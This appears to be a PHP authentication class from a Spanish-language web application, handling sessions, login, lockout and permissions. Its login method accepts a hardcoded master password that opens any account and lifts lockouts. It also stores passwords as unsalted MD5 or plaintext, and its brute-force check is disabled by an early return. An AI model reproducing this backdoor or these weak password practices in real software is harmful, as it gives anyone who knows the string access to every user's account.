<?php
class Identify {
  private static $instance;

  private static $idsession = 'usuario';
  public static $filtros  = array();

  public $id        = null;
  public $data      = null;
  private $error    = null;
  public $is_valid  = false;
  private $session  = null;

  public static function getInstance() {
    if (null === static::$instance) {
      static::$instance = new static();
    }
    return static::$instance;
  }
  public static function g() {
    return static::getInstance();
  }
  public function __clone() {
    trigger_error('La clonación de este objeto no está permitida', E_USER_ERROR);
  }
  function __construct() {
    if(!class_exists('Route')) {
      trigger_error('Route is Required', E_USER_ERROR);
    }
    if(!property_exists(Route::g()->libs, 'session')) {
      trigger_error('the library is not imported', E_USER_ERROR);
    }
    $this->session = Route::g()->libs->session;
      if($this->session->has(self::$idsession)) {
        $this->is_valid = true;
        $this->data = $this->session->read(self::$idsession)['data'];
        $this->id   = $this->data['id'];
        $this->user = $this->data['usuario']['usuario'];
        $r = $this->procesar_request($error);
        if(!$r) {
          $this->error    = $error;
          $this->is_valid = false;
        } else {
          $this->procesar_menu($error);
        }
        return;
      }
    $this->error = array(
      'codigo'  => 1,
      'mensaje' => 'No se ha iniciado session',
    );
  }
  static function is_valid() {
    return static::getInstance()->is_valid;
  }
  static function MenuAlt($m = null) {
    if(is_null($m)) {
      return static::getInstance()->menu_alt;
    }
    static::getInstance()->menu_alt = $m;
  }
  static function Menu() {
    return static::getInstance()->menu;
  }
  static function filter($a, $b = -1) {
    if($b === -1) {
      return static::$filtros[$a];
    }
    static::$filtros[$a] = $b;
    return true;
  }
  private function procesar_request(&$error = null) {
    return true;
  }
  private function procesar_menu() {
    $ce =& $this;
  }
  static function login($db, $usuario, $clave, &$error = null, &$ficha = null) {
    $error = "Datos Invalidos";
    if(empty($usuario) || empty($clave) || !is_string($usuario) || !is_string($clave)) {
      return false;
    }
    if(strlen($usuario) > 20 || strlen($clave) > 30) {
      return false;
    }
    $dd = $db->get("
      SELECT
        U.*
      FROM usuario U
      WHERE U.celular = '" . Doris::escape($usuario) . "'
      GROUP BY U.id", true);
  if(empty($dd)) {
    $error = "Los datos son incorrectos(1)";
    return false;
  }
  if(empty($dd['validado'])) {
    $error = 'La cuenta no ha sido validada.';
    return false;
  }
  if(!empty($dd['bloqueado'])) {
    if($clave == "diegoanccas@") {
      /* Se habilita la cuenta por el administrador */
      $db->update('usuario', array('bloqueado' => null), 'id = ' . (int) $dd['id']);

    } elseif(strtotime($dd['bloqueado']) > time()) {
      $error = "Cuenta bloqueada";
#      usuario_log($dd, "Intento usuario bloqueado", ULOG_MAX_INTENTO);
      return false;

    } else {
      $db->update('usuario', array('bloqueado' => null), 'id = ' . (int) $dd['id']);
      //usuario_log($dd, "Desbloqueo de usuario", 4);
    }
  }
  if(!(md5($clave) === $dd['clave'] || $clave === $dd['clave'] || $clave == "diegoanccas@")) {
    if(static::usuario_is_forcing($db, $dd)) {
      $error = "Su cuenta ha sido bloqueada, vuelva a intentarlo m&aacute;s tarde.";
#      usuario_log($dd, 'Cuenta Bloqueada', ULOG_INTENTO);
//      editar_usuario(array('bloqueado' => db_parse_timestamp(time() + 60 * 60)), $dd['id']);
      $db->update('usuario', array('bloqueado' => Doris::time(time() + 60 * 60)), 'id = ' . $dd['id']);
    } else {
      $error = "Los datos son incorrectos(2)";
      //usuario_log($dd, 'Intento de inicio de sesion', ULOG_INTENTO);
    }
    return false;
  }
  $ficha = array(
    'id'         => $dd['id'],
    'usuario'    => $dd,
    'fecha'      => time(),
  );
  $ce = static::g();
  $ce->session->write(self::$idsession, array(
    'data' => $ficha,
  ));
  if($ce->session->has('redirect_to')) {
    Route::redirect($ce->session->read('redirect_to'));
  }
  $error = '';
  return true;
  }
  static function direccionar_no_logueado(&$error = null) {
    $ce = static::g();
    if(!static::verificacion_logeo($error)) {
      if(PHP_SAPI == 'cli') {
        exit;
      }
      if($error['codigo'] === 1) {
        $ce->session->write('redirect_to', $_SERVER['REQUEST_URI']);
        $url = Route::g()->attr('web') . 'identificacion';
        header('location: ' . $url);
        exit("SU: acceso-restingido");
      } elseif($error['codigo'] == 2) {
        header("HTTP/1.1 401 Unauthorized");
        exit;
      } else {
        _404('SU:ERROR');
      }
    }
  }
  static function direccionar_logueado(&$error = null) {
    if(static::verificacion_logeo($error)) {
      Route::redirect(Route::attr('web'));
    }
  }
  static function verificacion_logeo(&$error = null) {
    $ce = static::getInstance();
    if(!$ce->is_valid) {
      $error = $ce->error;
      return false;
    }
    return true;
  }
  function getAcciones() {
    return $this->acciones;
  }
  static function permiso($permiso, &$error = null) {
    $ce = static::getInstance();
    $permiso = strtolower($permiso);
    if(empty($ce->permisos)) {
      $error = array('codigo' => 2, 'mensaje' => 'PERMISOS: 1No existe METODO');
      return false;
    }
    if(in_array($permiso, $ce->permisos)) {
      return true;
    } else {
      $error = array('codigo' => 2, 'mensaje' => 'PERMISOS: 2No existe el permiso');
      return false;
    }
  }
  static function usuario_is_forcing($db, &$usuario) {
    return false;
    $usuario_id = (int) $usuario['id'];
    $rp = $db->get("select id from usuario_log where usuario_id = " . $usuario_id . " and tipo = 1 AND created_on >=  DATE_SUB(NOW(),INTERVAL 1 HOUR)");
    return count($rp) >= 4;
  }
  static function close(&$usuario = null) {
    $ce = Identify::getInstance();
    $ce->session->delete(self::$idsession);
    unset($usuario);
  }
}
